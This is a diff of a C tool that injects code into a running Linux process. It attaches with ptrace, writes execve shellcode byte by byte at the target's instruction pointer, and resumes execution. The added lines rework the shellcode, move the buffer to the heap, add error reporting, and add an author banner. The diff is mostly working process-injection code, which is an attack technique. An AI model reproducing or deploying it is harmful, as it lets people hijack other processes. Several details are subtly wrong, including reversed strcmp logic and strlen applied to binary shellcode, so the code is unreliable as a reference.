@@ -27,30 +27,20 @@
 
 #define __OUTPUT__ // whether you want output
 #define __DEBUG__  // whether you want _more_ output
+#define __BANNER__ // whether you want a banner
 
 #ifdef __DEBUG__
 #  ifndef __OUTPUT__
 #    define __OUTPUT__
 #  endif
-#  define DEBUG "\033[34m[+]\033[0m"
+#  define DEBUG "\033[34m[-]\033[0m"
 #endif
 
 #ifdef __OUTPUT__
 #  include<stdio.h>
-#  define INFO "\033[32m[-]\033[0m"
+#  define INFO "\033[32m[+]\033[0m"
+#  define ERR  "\033[31m[!]\033[0m"
 #  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE]\n", X); exit(1);
-#  define LOGO \
-printf("\033[94m\n"); \
-printf(" .ei88ie.\n"); \
-printf(".fE'  'Gf\n"); \
-printf("i8      8i\n"); \
-printf("D8      8L\n"); \
-printf("D8.    .8I\n"); \
-printf(":GL    j8'\n"); \
-printf(" 't8jj9t'reg@n0\n"); \
-printf(" --------------\n"); \
-printf("\033[32m : Author: Roan Rothrock\n : <roan.rothrock@hotmail.com>\n"); \
-printf("\033[0m");
 #endif
 
 #define __GNU_SOURCE
@@ -70,16 +60,15 @@ printf("\033[0m");
 #  define IP_REG RIP
 #  define PTR_T u_int64_t
 
+// this is used ONLY if an executable is supplied as the second arguemnt
 static u_int8_t base_shellcode[] = {
   0x48, 0x31, 0xc0,                         // xor rax, rax
   0x48, 0x31, 0xff,                         // xor rdi, rdi
   0x48, 0x31, 0xf6,                         // xor rsi, rsi
   0x48, 0x31, 0xd2,                         // xor rdx, rdx
-  0x48, 0x8d, 0x3d, 0x37, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
+  0x48, 0x8d, 0x3d, 0x29, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101029]
   0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
-  0x48, 0x8d, 0x35, 0x29, 0x10, 0x10, 0x10, // lea rsi, [rip+0x10101029]
-  0x48, 0x81, 0xee, 0x10, 0x10, 0x10, 0x10, // sub rsi, 0x10101010
-  0x56,                                     // push rsi
+  0x57,                                     // push rdi
   0x48, 0x89, 0xe6,                         // mov rsi, rsp
   0xb0, 0x3b,                               // mov al, 59 ; execve()
   0x0f, 0x05,                               // syscall
@@ -139,11 +128,35 @@ PTR_T get_ip_reg(pid_t pid)
   return (PTR_T) (ret + OFFSET);
 }
 
+const char *get_file_extension(char *pathname)
+{
+  char *ptr;
+  for(ptr = pathname + strlen(pathname); ptr > pathname; ptr--)
+  {
+    if(strcmp(ptr, "."))
+    {
+      return ptr;
+    }
+  }
+  return pathname;
+}
+
 int main(int argc, char *argv[])
 {
-  #ifdef __OUTPUT__
-  LOGO;
+  #ifdef __BANNER__
+  printf("\033[32m\
+  ..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..\n\
+ .::::_|_|::::_|_|_|::::_|_|_|_|::::_|_|_|::::_|_|::::_|::::::_|::::_|_|::::.\n\
+ .::_|::::_|::_|::::_|::_|::::::::_|::::::::_|::::_|::_|_|::::_|::_|::::_|::.\n\
+ .::_|::::_|::_|_|_|::::_|_|_|::::_|::_|_|::_|_|_|_|::_|::_|::_|::_|::::_|::.\n\
+ .::_|::::_|::_|::::_|::_|::::::::_|::::_|::_|::::_|::_|::::_|_|::_|::::_|::.\n\
+ .::::_|_|::::_|::::_|::_|_|_|_|::::_|_|_|::_|::::_|::_|::::::_|::::_|_|:::.\n\
+  .:::::::::::::::::::::::::::Roan:Rothrock::<roan.rothrock@hotmail.com>::.\n\
+\033[0m");
   #endif
+
+  u_int8_t *shellcode;
+  size_t shellcode_size;
 
   int ret; // to be used again and again
   pid_t pid;
@@ -165,12 +178,18 @@ int main(int argc, char *argv[])
     {
       // argv[1] is pathname
       // fork() and get PID
+      #ifdef __OUTPUT__
+      printf("%s Starting child.\n", INFO);
+      #endif
       pid = fork();
 
       if(pid == 0)
       {
         child(argv[1]);
       }
+      #ifdef __OUTPUT__
+      printf("%s Child PID: %i.\n", INFO, pid);
+      #endif
     }
 
     // handling argv[2]
@@ -181,15 +200,11 @@ int main(int argc, char *argv[])
     HELP(argv[0]);
   }
 
-  #ifdef __OUTPUT__
-  printf("%s Child PID: %i\n", INFO, pid);
-  #endif
-
   ret = attach(pid);
   if (ret != 0)
   {
     #ifdef __OUTPUT__
-    printf("%s Failed to attach to process: %s\n", INFO, strerror(errno));
+    printf("%s Failed to attach to process: %s\n", ERR, strerror(errno));
     #endif
 
     exit(1);
@@ -200,15 +215,16 @@ int main(int argc, char *argv[])
 
   // appending `pathname` to shellcode
 
-  size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);
+  shellcode_size = strlen(base_shellcode) + strlen(pathname) + 1;
 
   #ifdef __DEBUG__
   printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);
   #endif
 
-  u_int8_t shellcode[shellcode_size];
+  shellcode = malloc(shellcode_size);
   strcpy(shellcode, base_shellcode);
   strcat(shellcode, pathname);
+  strcat(shellcode, "\0");
 
   #ifdef __DEBUG__
   printf("%s Shellcode: ", DEBUG);
@@ -218,7 +234,7 @@ int main(int argc, char *argv[])
     {
       printf("\n");
     }
-    printf("0x%02x ", shellcode[i]);
+    printf("0x%02x ", *(shellcode + i));
   }
   printf("\n");
   #endif
@@ -233,42 +249,58 @@ int main(int argc, char *argv[])
   printf("%s Injecting shellcode...\n", INFO);
   #endif
 
-  for(int i = 0; i < sizeof(shellcode); i++, ip++)
+  for(int i = 0; i < strlen(shellcode); i++, ip++)
   {
     // too much output
     //#ifdef __DEBUG__
-    //printf("%s 0x%02x  %c\t%p\n", DEBUG, shellcode[i], shellcode[i], ip);
+    //printf("%s %i: 0x%02x  %c\t%p\n", DEBUG, i, *(shellcode + i), *(shellcode + i), ip);
     //#endif
 
-    ret = ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
+    ret = ptrace(PTRACE_POKETEXT, pid, ip, *(shellcode + i));
     if(ret != 0)
     {
       #ifdef __OUTPUT__
-      printf("%s Error in injection: %s\n", INFO, strerror(errno));
-      printf("%s Aborting...\n", INFO);
+      printf("%s Error in injection: %s\n", ERR, strerror(errno));
+      printf("%s Aborting...\n", ERR);
       #endif
       exit(1);
     }
   }
 
   #ifdef __OUTPUT__
-  printf("%s Shellcode injected. Restarting process.\n", INFO);
+  printf("%s Shellcode injected. Sending SIGCONT.\n", INFO);
+  #  ifdef __DEBUG__
+  printf("%s Seding SIGCONT with PTRACE_CONT\n", DEBUG);
+  #  endif
   #endif
 
-  ptrace(PTRACE_CONT, pid, 0, 0);
+  ret = ptrace(PTRACE_CONT, pid, 0, 0);
+  if(ret != 0)
+  {
+    #ifdef __OUTPUT__
+    printf("%s Failed to start process: %s\n", ERR, strerror(errno));
+    #endif
+
+    exit(1);
+  }
 
   int status;
   ret = waitpid(pid, &status, 0);
 
   #ifdef __OUTPUT__
-  if(ret < 0)
+  switch(WSTOPSIG(status))
   {
-    printf("%s waitpid failed. Exiting...\n", INFO);
-  } else
-  if(ret == pid)
-  {
-    printf("%s Child exited. Exiting...\n", INFO);
+    case SIGTRAP:
+      printf("%s Shellcode seems to have executed.\n", INFO);
+      break;
+    case SIGSEGV:
+      printf("%s Shellcode caused the program to segfault.\n", ERR);
+      #ifdef __DEBUG__
+      printf("%s This could be caused by the shellcode exceeding the program bounds.\n", DEBUG);
+      #endif
+      break;
   }
+  printf("%s Exiting...\n", INFO);
   #endif
 
   return 0;
